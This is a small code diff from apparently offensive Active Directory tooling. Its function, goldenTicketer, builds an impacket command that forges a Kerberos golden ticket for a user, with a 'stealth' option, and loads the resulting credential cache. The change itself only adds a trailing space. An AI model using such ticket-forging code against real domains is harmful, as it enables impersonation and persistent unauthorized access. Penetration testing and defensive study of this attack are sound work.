@@ -236,7 +236,7 @@ def goldenTicketer(user: User):
           f"{args.custom}"
     if args.stealth:
         logger.warning("WARNING: Be sure to use the latest version of impacket!")
-        cmd += f"-duration 10 -extra-pac"
+        cmd += f"-duration 10 -extra-pac "
     cmd += "'"+user.username+"'"
     cmd += f" && export KRB5CCNAME=$(pwd)/'{user.username}.ccache'"
     print(cmd)
